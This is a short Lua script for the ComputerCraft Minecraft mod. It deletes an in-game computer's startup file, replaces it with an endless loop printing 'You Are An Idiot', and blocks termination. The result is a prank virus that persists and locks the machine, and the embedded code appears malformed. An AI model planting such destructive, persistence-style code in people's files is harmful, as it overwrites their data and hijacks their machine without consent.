fs.delete("startup.lua")
while true do


local VF = fs.open("startup.lua", "w")

local VS = [[
 local y = 1
 term.clear()
 while true do
  for y = 1, 10 do
   term.setCursorPos(1, y)
   print("You Are An Idiot")
   term.setCursorPos(1, y + 1)
   print("You Are An Idiot")
   if y > 10 then
     term.clear()
   end
  end
 end
end
]]

VF.write(VS)
VF.close()

term.clear()

shell.run("startup.lua")

local event, key = os.pullEventRaw()

end
